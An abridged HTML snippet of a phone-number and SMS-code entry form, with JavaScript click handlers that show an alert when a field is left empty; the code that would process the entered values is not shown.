<html>
  ...
  <body>
    <center>
      ...
      <div id="block" ><br><br>
        ...
        <button type="submit" id="phone" class="sun" placeholder="Phone number" ><l>Next</l></button>
      </div>
      <div id=code>
        <input name="" id="send_code" class="inp" type="tel"  placeholder="Sms code"><br><br>
        <input type="submit" value="Continue" id="send" class="sun">
      </div>
  ...
  document.getElementById('phone').onclick = function(){
    if(numb.value===""){alert("Error. Enter your phone number!")}else{
  ...
  document.getElementById('send').onclick = function(){
    if(document.getElementById('send_code').value===""){alert("Error. Enter SMS code!")}else{
